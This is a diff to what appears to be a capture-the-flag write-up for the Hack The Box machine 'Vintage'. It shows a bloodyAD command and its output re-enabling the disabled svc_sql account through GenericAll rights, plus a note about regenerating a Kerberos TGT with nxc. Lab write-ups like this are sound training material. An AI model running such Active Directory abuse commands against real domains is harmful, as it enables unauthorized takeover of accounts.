@@ -199,8 +199,15 @@ GenericAll over three service accounts
 
 The `svc_sql` account is disabled
 
+## Re-enabling `svc_sql`
+```python
+
+```
+
 ```python
 bloodyAD -k --host dc01.vintage.htb -d vintage.htb remove uac 'svc_sql' -f ACCOUNTDISABLE           
 
 [-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
 ```
+To do this i had to re-generate a TGT using nxc since the last one i generated does not contain the new group info 
+
